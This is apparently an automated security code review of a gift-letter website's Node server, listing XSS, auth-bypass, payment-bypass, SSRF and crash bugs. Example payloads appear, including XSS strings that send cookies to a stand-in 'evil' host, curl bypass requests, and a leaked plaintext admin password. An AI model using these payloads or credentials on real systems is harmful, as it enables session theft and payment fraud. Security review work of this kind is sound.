# CodeRabbit review - 2luv birthday website

**22 findings** - critical: 8, major: 8, minor: 6

Reviewed: api-stub/server.js, api-stub/admin.html, ai-service/server.js, config.js, package.json, README.md

## CRITICAL (8)

### Fix stored XSS in the admin dashboard. Escape every interpolated field.
`api-stub/admin.html:1306-1316`

These rows insert raw values into innerHTML and into onclick attribute strings: - renderVouchers: v.code and v.note. - renderLetters: l.shareableLink || l.id and bDate. Anonymous users can write these values: - serveStaticFile saves a new letter for any slug that matches [^\/\.]+. - /api/letter/:link/update lets anyone without a password set specialDate. Example attack: an attacker opens /en/letter/<img src=x onerror=fetch('//evil/'+document.cookie)>. The admin opens the Letters tab, and the payload runs with full admin authority. Once it runs, it can change the gateway, the UPI ID, vouchers, 

### Fix the letter password check. Any visitor can bypass it by setting a cookie.
`api-stub/server.js:86-95`

isLetterUnlockedForRequest accepts the request if the Cookie header contains 2luv_unlocked_<link>=1. The client chooses that value, and nothing signs or binds it to the server. Example: curl -H 'Cookie: 2luv_unlocked_test-pw-gift-2026=1' /api/letter/test-pw-gift-2026 returns the protected letter. cookieHeader.includes(...) also matches substrings of other cookie names. Issue a random token when the password is verified. Store the token on the server,  mapped to the letter, or sign it with an HMAC over the link and an expiry. Validate the token in this function.

### Remove the plaintext admin password and the hard-coded hash.
`api-stub/server.js:133-134`

The comment // dipkp@2909 publishes the supervisor password. The same hash is the default at line 134, the fallback at lines 1228 and 1287, and the value in api-stub/settings.json. Anyone with repository access can log in to /admin. After login they can switch the gateway to free, change the payout UPI ID, or read every letter. /api/admin/login has two more weaknesses: - It uses unsalted SHA-256. - It has no rate limit. checkPasswordRateLimit is used only for letter passwords. Required changes: - Rotate the password now. - Load the hash from an environment variable or a first-run setup step. -

### Authenticate the YouPI webhook.
`api-stub/server.js:1589-1607`

Anyone can POST {"status":"SUCCESS","paymentId":"<id>"} and mark the matching letter as paid. The handler has no signature check, no shared secret and no source check. If the handler finds no session, it strips ORD- from orderId and passes the rest to markLetterAsPaid. That function creates and saves a new paid letter for any arbitrary string. Verify an HMAC signature from YouPI over the raw body (rawBuffer). Mark a letter as paid only when a known paymentSessions entry matches. Check that amount matches before you mark the letter as paid.

### Verify payment before `/api/payments/verify-utr` unlocks a letter.
`api-stub/server.js:1610-1643`

Any string with 8 or more characters unlocks any letterRef, so every buyer can skip payment. Example: curl -d '{"utr":"12345678","letterRef":"x"}'. When the request includes a paymentId, the stub calls the YouPI admin confirm endpoint. It ignores the response and marks the letter paid anyway. The Razorpay handler at line 792 uses this same endpoint and passes razorpay_payment_id with no server-side signature check. Keep UTR submissions as PENDING_REVIEW and let an admin approve them. For Razorpay, verify razorpay_signature with the key secret on the server. Call markLetterAsPaid only after a c

### Require authorization for `/api/letter/:link/update`.
`api-stub/server.js:2377-2402`

If a letter has no password, isUnlocked is true. Anyone can then change any letter's message, recipient, or dates. An attacker can also set a password on the letter and lock out the real recipient and sender. If a letter has a password, the forgeable unlock cookie from isLetterUnlockedForRequest also passes this check. The handler then echoes the full letter, including password, in the response. Issue a sender edit token when the letter is created, and require it here. Leave the response without the password field.

### Fix `/api/gifts/find-by-email`. It returns every letter, with plaintext passwords, to anyone.
`api-stub/server.js:2431-2433`

The handler returns Object.values(letters) without authentication or filtering. That data includes password, names, birth dates and photo URLs. handleApiRequest reflects any Origin and sends Access-Control-Allow-Private-Network: true, so any website can read this data from a visitor's browser. Filter by a verified owner identity. Run each record through sanitizeLetterForRecipient. Until email lookup exists, return an empty list.

### Stop GET requests from creating letters or marking letters as paid.
`api-stub/server.js:3972-4004`

This block has two problems: - A visit to any unknown slug saves a new letter to letters.json. Crawlers and attackers can fill the store with junk entries, and each entry appears in the admin dashboard. - ?payment=success sets paid = true and status = 'published' on any existing letter. Anyone can unlock a letter by adding that query string to the link. markLetterAsPaid also creates paid letters for unknown refs. /pay calls it in free mode, and the webhook and UTR paths call it too. For an unknown slug, return 404 and save nothing. Treat payment=success only as a display flag. Read paid status

## MAJOR (8)

### Move `YOUPIADMINTOKEN` out of source control.
`api-stub/server.js:230-230`

This bearer token authorizes /api/v1/admin/payments/:id/confirm on the YouPI gateway. Anyone who reads the repository can confirm payments directly on that gateway. Rotate the token. Load it from process.env.YOUPI_ADMIN_TOKEN and fail at startup if it is missing. The hard-coded payout identifiers also put PII in source: 9327792155@upi is a phone number. Move them into configuration that is not committed.

### Match payment sessions by `letterRef` before reusing one.
`api-stub/server.js:457-461`

getOrCreatePaymentSession returns any INITIATED session created in the last hour, whatever letter it belongs to. Example: buyer A starts checkout. Within the hour, buyer B opens /pay?letter=B. The server redirects B to A's /checkout/<paymentId>. When B pays, the webhook marks letter A as paid, and letter B stays locked.

### Fix reflected XSS in the checkout pages.
`api-stub/server.js:665-666`

letterRef comes from ?letter= without validation. These lines insert it directly into an inline script as const letterRef = "${letterRef}";. A link like /pay?letter=%22;fetch('//evil?'+document.cookie)// runs attacker code on the site origin. That code runs on a page where the victim is about to pay, so it can change the payee UPI ID. payee and upiId are also inserted without escaping into HTML and JavaScript at lines 555, 632, 643, 717, 752, 763 and 789. Serialize values for scripts with JSON.stringify(value).replace(/</g,'\\u003c'). The existing safeJsonStringify does this. Use escapeHtml fo

### Limit request body size.
`api-stub/server.js:964-971`

readRawBody buffers the whole request in memory with no limit. handleApiRequest calls it for every POST, PUT and PATCH, and the upload routes need no authentication: /__r2-part/uploads/*, /api/upload-image and the draft chunk routes. One large or slow upload can exhaust memory. Each writeFileSync also writes to disk without limit, and the upload routes have no auth or quota. Reject bodies above a cap, for example 10 MB for photo chunks and 1 MB for JSON. Track chunks size and call req.destroy() when the size goes over the cap.

### Import `https`, and restrict `/api/audio-proxy` to stop SSRF.
`api-stub/server.js:1137-1148`

The file never requires https. For any https: URL, line 1147 throws ReferenceError: https is not defined: - On the first call, the outer try catches the error and returns 400, so remote HTTPS audio never works. - On a redirect, the throw happens inside the client.get callback. Nothing catches it there, so the whole server process crashes. Any http:// URL that redirects to https:// triggers this. The proxy also fetches any URL an anonymous caller supplies, including internal targets. Examples are http://127.0.0.1:6100/... (YouPI) and http://169.254.169.254/ (cloud metadata). The response comes 

### Escape `recipient` and `link` in the letter shell.
`api-stub/server.js:3073-3073`

recipient goes raw into HTML at lines 3073 and 3206. Anyone can set recipientName through the unauthenticated /update endpoint, which makes this stored XSS. link comes from the URL path after decodeURIComponent. Line 3958 allows ', " and < in link. These lines insert it raw into JavaScript strings ('${link}', "${link}" and /api/letter/${link}/update). A crafted URL such as /en/letter/x%27)%3Balert(1)%2F%2F therefore runs script. That URL can also be shared as a gift link. letter.theme, canonicalUrl and paymentId have the same problem. Use escapeHtml() for HTML contexts. Use JSON.stringify with

### Withhold unpaid letter content from the page.
`api-stub/server.js:3548-3548`

The page always embeds sanitizeLetterForRecipient(letter) in __sveltekit data. /api/letter/:link at line 2427 also returns it without checking isPaid. requiresPaymentUnlock and #luvePayGate are only a client-side overlay. Viewing the page source or calling the API shows the full gift without payment. Return a stub such as recipient name and theme when !isPaid. Send the full content only after the server confirms payment. Also applies to: 3556-3556

### Catch malformed URL encoding. One request can crash the server.
`api-stub/server.js:3933-3934`

decodeURIComponent('/%') throws URIError. serveStaticFile runs synchronously inside the http.createServer callback, so the exception is uncaught and stops the process. GET /% is enough to take the site down. handleApiRequest has the same problem: /api/letter/%, /api/admin/letters/% and other routes call decodeURIComponent inside an async function. Node ≥15, which engines allows, ends the process on an unhandled rejection. Wrap the decode in try/catch and return 400. Also add .catch() around handleApiRequest(...) calls in both servers. The catch handler should send 500.

## MINOR (6)

### Replace this README. It documents a different project.
`README.md:1-37`

The README describes "Dani Cross Strength", a static strength-coach landing page with Calendly and Google Fonts on http://localhost:3000. This repository is the 2luv gift-letter server. npm start runs node api-stub/server.js, which listens on port 8900 (WEB_PORT). The README also says "static site; host on Vercel, Netlify or Cloudflare Pages", but the app needs a Node process with persistent disk under api-stub/data. A developer who follows these steps opens the wrong port and deploys the app to the wrong kind of host. Rewrite the README to cover these points: - Run commands for api-stub and a

### Prune expired AI sessions. The `SESSIONS` map grows without limit.
`ai-service/server.js:50-65`

Each request to /api/ai/session adds an entry to SESSIONS. getSession removes an expired entry only when a client looks up that same id. Sessions that nobody reuses stay in memory for the life of the process. Any caller that hits /api/ai/session in a loop can grow the heap until the process runs out of memory. The ALLOWED CORS check does not stop this, because CORS controls only whether a browser can read the response. Add a periodic sweep. A hard cap on the number of sessions is also an option.

### Stop the test when the server does not return status 200.
`ai-service/test-roundtrip.js:14-31`

The script reads env.ct without checking res.status. Two cases fail this way: - The session is missing, so the server returns 428 { error: 'session_required' }. - The model fails, so the server returns 502. In both cases Buffer.from(env.ct, 'base64') throws a TypeError. The script then dies with an unhandled rejection instead of a clear failure message. The script also exits 0 when "tamper: NOT detected" prints, so automation cannot detect a broken integrity check. Assert res.ok. Call process.exit(1) on both failure paths.

### Remove this runtime data file from the repository.
`api-stub/letters.json:1-654`

The server reads path.join(__dirname, 'data', 'letters.json'), which is api-stub/data/letters.json. Nothing loads this file at api-stub/letters.json, so it is a stale snapshot. The file also commits real-looking user data: - Names and birth dates. - An /uploads/ photo reference. - A plaintext letter password ("password": "mysecretpassword"). The data is also internally inconsistent. birthday-simran-ad0kr is paid: true, but its alias letter-1793420339157 is paid: false. Delete the file. Add api-stub/data/ and api-stub/uploads/ to .gitignore. If seed fixtures are needed, use synthetic data in a 

### Compute `PRICING` per request.
`api-stub/server.js:985-996`

PRICING is built once at module load from the startup value of PRICE_INR. After an admin changes defaultPrice, syncGlobalVars() updates PRICE_INR. /api/pricing/landing still returns the old price until the server restarts. Users then see a price that differs from the checkout amount. Build the object in a function and call it inside the /api/pricing/landing handler.

### Remove this file. Nothing loads it, and it commits the admin password hash.
`api-stub/settings.json:1-28`

The server reads api-stub/data/settings.json (SETTINGS_FILE), not this path. This copy is never loaded. It still publishes adminPasswordHash. Line 134 of server.js has the plaintext of that hash in a comment. The file also publishes the payout UPI IDs, including a phone-number VPA. Delete the file. Put default settings without secrets in code or in an example file such as settings.example.json. Ignore api-stub/data/.
